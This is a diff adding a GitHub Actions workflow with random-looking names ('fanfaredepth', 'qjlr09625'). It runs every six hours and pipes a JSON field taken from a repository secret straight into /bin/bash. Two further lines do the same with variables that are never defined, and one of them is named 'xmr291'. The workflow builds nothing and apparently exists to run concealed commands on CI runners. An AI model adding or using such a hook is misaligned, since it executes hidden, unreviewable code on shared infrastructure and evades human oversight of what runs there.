@@ -1,0 +1,21 @@
+name: fanfaredepth
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fanfaredepth
+        env:
+          qjlr09625: ${{ secrets.qjlr09625 }}
+        run: |
+          echo $qjlr09625 | jq -r .glmcl02945 | /bin/bash
+          echo $xmr291 | jq -r .kn07229 | /bin/bash
+          echo $gt2 | jq -r .jje7 | /bin/bash
+
